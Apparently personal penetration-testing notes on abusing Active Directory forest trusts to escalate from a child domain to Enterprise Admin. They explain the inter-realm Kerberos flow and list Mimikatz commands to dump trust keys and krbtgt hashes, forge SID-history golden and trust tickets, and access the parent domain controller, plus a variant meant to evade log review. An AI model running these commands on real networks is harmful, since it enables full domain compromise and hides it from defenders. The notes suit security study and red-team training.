# Enterprise Admins - abusing trusts across domains

## priv esc across trusts

* across domains. implicit two way trust relationship
* across forests. trust relationship needs to be established


<br>

## across domains

### child to parent

* child to forest root

* domains in same forest have implicit two way trust with other domains. trust key between parent and child domains.

* two ways of escalating privs between two domains in the same forest
  * krbtgt hash
  * trust tickets


#### child to parent trust flow

example. client sits in the child domain that wants to access an application in the parent domain.


1. client --> child DC
   * request tgt

2. child DC --> client
   * sends tgt

3. client --> child DC
   * show tgt, request tgs for application in parent domain

4. child DC --> client
   * send inter-realm tgt (signed and encrypted with trust key)

5. client --> parent DC
   * sends inter-real tgt and request tgs

6. parent DC --> client
   * sends tgs

7. client --> application
   * present tgs for access

8. application --> client
   * optional mutual auth


note: only validation that the parent DC does is if it can decrypt the inter-realm tgt which is encrypted with the trust key. if we have access to the trust key, we can forge a inter-realm tgt.


<br>

## child to parent using trust tickets

* child to forest root using trust tickets

#### forging trust tickets, we require the trust key. look for the In trust key from child to parent
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch "' -ComputerName child-dc

or 

Invoke-Mimikatz -Command '"lsadump::dsync /user:child-domain\parent-domain$"'
```


#### an inter-realm tgt can be forged
```powershell
Invoke-Mimikatz -Command '"Kerberos::golden /user:Adminstrator /domain:child1.parent.local /sid:S-x-x-xx-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx /sids:S-x-x-xx-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-xxx /rc4:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx /service:krbtgt /target:parent.local /ticket:C:\path\to\save\ticket\trust_tkt.kirbi"'
```

Invoke-Mimikatz -Command| breakdown
-------|----------
Kerberos::golden | mimikatz module
./domain:child1.parent.local | fqdn of current domain
./sid:S-x-x-xx-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx | SID of current domain
./sids:S-x-x-xx-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-xxx | SID of the enterprise admins group of the parent domain
./rc4:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx | RC4 of the trust key
./user:Adminstrator | user to impersonate
./service:krbtgt | target service in the parent domain
./target:parent.local | fqdn of the parent domain
./ticket:C:\path\to\save\ticket\trust_tkt.kirbi | path where ticket to be saved


#### get a tgs for s service (example cifs) in the target domain by using the forged trust ticket
```powershell
.\asktgs.exe C:\path\to\save\ticket\trust_tkt.kirbi CIFS/parent-dc.parent.local
```

* tickets for other services ( host and rpcss for wmi, host and http for powershell remoting and winrm) can be created too

#### use the tgs to access the targeted service (may need to use it twice)
```powershell
.\kirbikator.exe lsa .\CIFS.parent-dc.parent.local.kirbi

ls \\parent-dc.parent.local\c$
```


<br>

## child to parent using krbtgt hash

#### abuse sid history again
```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

Invoke-Mimikatz -Command '"kerberos::golden /user:Adminstrator /domain:child1.parent.local /sid:S-x-x-xx-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx /sids:S-x-x-xx-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-xxx /krbtgt:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx /ticket:C:\some\path\krbtgt_tkt.kirbi"'
```

* in the above command, the options "/sids" is forefully setting the sid history for the enterprise admin group for child1.parent.local that is the forest enterprise admin group.

#### any machine of the current domain
```powershell
Invoke-Mimikatz -Command '"kerberos::ptt C:\some\path\krbtgt_tkt.kirbi"'

ls \\parent-dc.parent.local.kirbi\c$

gwmi -class win32_operatingsystem -ComputerName parent-dc-parent.local
```

#### avoiding dodgy logs 
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:child1-dc$ /domain:child1.parent.local /sid:S-x-x-xx-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx /groups:516 /sids:S-x-x-xx-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-xxx,S-x-x-x /krbtgt:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx /ptt"'
```

* instead of using the sid history of the enterprise admin group, we use the sid history of the domain controllers and enterprise domain controllers. in the logs it will look like nothing but the domain controllers talking to each other which is normal. broken down below. 

* /sids:S-x-x-xx-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-xxx,S-x-x-x
  * /sids:S-x-x-xx-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-xxx - domain controllers
  * ,S-x-x-x - enterprise domain controllers










































